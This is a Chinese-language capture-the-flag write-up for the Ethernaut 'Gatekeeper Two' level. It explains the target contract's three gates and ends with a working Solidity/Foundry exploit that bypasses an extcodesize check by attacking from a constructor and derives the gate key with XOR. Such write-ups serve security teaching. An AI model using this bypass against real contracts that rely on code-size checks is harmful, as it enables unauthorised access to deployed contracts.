# Level 14 - Gatekeeper Two
## 題目
[Gatekeeper Two](https://ethernaut.openzeppelin.com/level/0x0C791D1923c738AC8c4ACFD0A60382eE5FF08a23)

### 通關條件
守衛帶來了一些新的挑戰，同樣地，你需要注冊為參賽者才能通過這一關
### 提示
- 回想一下你從上一個守衛那學到了什麽，第一道門是一樣的
- 第二道門的 `assembly` 關鍵字可以讓合約去存取 Solidity 非原生的功能。參見 [Solidity Assembly](http://solidity.readthedocs.io/en/v0.4.23/assembly.html)。在這道門的 `extcodesize` 函式，可以用來得到給定地址的合約程式碼長度，你可以在[黃皮書](https://ethereum.github.io/yellowpaper/paper.pdf)的第七章學到更多相關的資訊。
- `^` 字元在第三個門裡是位元運算 (XOR)，在這裡是為了應用另一個常見的位元運算手段 (參見 [Solidity cheatsheet](http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet))。[Coin Flip](https://hackmd.io/@D13/ethernaut3) 關卡也是一個想要破這關很好的參考資料。
### 合約內容
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
## 解題
- `assembly` 的重點就是可以在合約裡直接操作 opcode (操作碼)，opcode 就是比 solidity 更底層的語言。`assembly` 可以讓你直接使用這些操作碼提升效能並降低 gas 費用；缺點是沒有安全性的檢查或是容易發生一些意外的錯誤
- 這邊提到使用 `extcodesize` 函式，這個函式會回傳輸入地址的合約程式碼長度，正常情況下可以用來判斷這個地址是合約還是 EOA。
- XOR 稱為互斥或，簡單來說就是一種 bit 的運算，算法如下：
一樣為 0，不一樣為 1
    | A   | B   | A^B |
    | --- | --- | --- |
    | 0   | 0   | 0   |
    | 1   | 0   | 1   |
    | 0   | 1   | 1   |
    | 1   | 1   | 0   |


---
跟上一題一樣，將判斷條件拆開來看
### 通過 `gateOne()`
上一題也有一樣的條件，用一樣的方法通過即可
### 通過 `gateTwo()`
第二個條件用到 opcode `extcodesize()`，剛剛有提到他會返回目標合約的程式碼長度， 17 行規定合約的程式碼長度要等於 0，這邊我們只要將攻擊合約的 code 都寫在 `constructor()` 就可以繞過長度檢查了。
```solidity
modifier gateTwo() {
    uint256 x;
    assembly {
        x := extcodesize(caller())
    }
    require(x == 0);
    _;
}
```
>[!Tip]
>合約要部署的時候會被轉成 bytecode，bytecode 會將合約的 function 分成兩種來儲存：
>  - **Creation**
>  用途：**Creation** 儲存創建合約時會用到的 `constructor()`。它在合約創建過程中被執行，主要負責初始化合約的狀態和變數設定。
>  特點：這部分的 code 在合約部署時會被執行一次，完成合約的部署和初始化。執行完畢後，這部分會被移除，也就是說不會被儲存在區塊中。
>  - **Runtime**
>  用途：**Runtime** 儲存合約部署後實際執行的 function。它處理合約的函數調用和邏輯運算。
>  特點：部署完成後，**Creation** 會被清除，只留下 **Runtime**。合約的所有交互和狀態更新都是通過這部分來完成的。
>
>詳細可以參考以下兩篇：
>- [Deconstructing a Solidity Contract - Part II: Creation vs. Runtime](https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-ii-creation-vs-runtime-6b9d60ecb44c)
>- [深入解析Solidity合約](https://medium.com/taipei-ethereum-meetup/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90solidity%E5%90%88%E7%B4%84-4213c8c7dfa0)

關於這類型的攻擊也可以參考 [WTF Solidity 合约安全: S08. 绕过合约长度检查
](https://github.com/AmazingAng/WTF-Solidity/blob/main/S08_ContractCheck/readme.md)
### 通過 `gateThree(bytes8 _gateKey)`
```solidity
modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
}
```
第三個條件要判斷 `msg.sender`, `_gateKey` 兩個變數經過一些轉換後再做 XOR 運算，出來的答案是否等於 `uint64` 的最大值；就是在問 `A^B == C?` 的問題
XOR 具有 `A^B=C, A^C=B` 的特性。所以我們只要將 `msg.sender` 與 `type(uint64).max)` 做 XOR 運算就可以得到 `_gateKey`

重新統整一下攻擊的設計重點：
  1. 呼叫另一個攻擊合約
  2. 攻擊實作在 `constructor()` 中
  3. `_gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;`
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/14_GatekeeperTwo.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        GatekeeperTwoAttacker attacker = new GatekeeperTwoAttacker(your_challenge_address);    

        vm.stopBroadcast();
    }
}

contract GatekeeperTwoAttacker {

    constructor(address _target) {
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        (bool result,) = _target.call(abi.encodeWithSignature("enter(bytes8)",bytes8(key)));
    }
}
```
